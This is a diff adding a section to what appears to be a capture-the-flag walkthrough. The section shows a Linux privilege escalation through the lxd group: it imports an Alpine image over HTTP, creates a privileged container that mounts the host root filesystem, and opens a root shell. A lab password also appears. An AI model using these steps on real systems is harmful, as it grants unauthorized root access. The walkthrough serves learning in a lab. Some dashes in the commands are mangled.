@@ -198,13 +198,46 @@ password: E@syR18ght
 
 `sudo -l` - we can exploit the socat binary.
 
+### Method 6
 
+We could also exploit the `lxd` group. The "elyana" user is part of the `lxd` group.
 
+Following the steps in this repo --> [https://github.com/saghul/lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder)
 
+#### Steps to exploit:
 
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+# 1
+# build the image on kali 1st.
+./build-alpine
 
+# 2
+# Now import the .tar into the target machine.
+python -m http.server 80
+wget http://<ip>
 
+# 3
+# use any name for alias.
+lxc image import ./alpine-v3.12-x86_64–20201225_1814.tar.gz —alias jin
 
+# 4
+# list all images.
+lxc image list
+
+# 5
+# Now create ignite first , and after add ignite in “mydevice” with the path:/mnt/root after you can start ignite and execute it ! And we are ROOT!
+lxc init jin ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+id
+```
+{% endcode %}
+
+Obviously the root flag is under / mnt / root / root, where we have mounted it.
+
+Done.
 
 
 
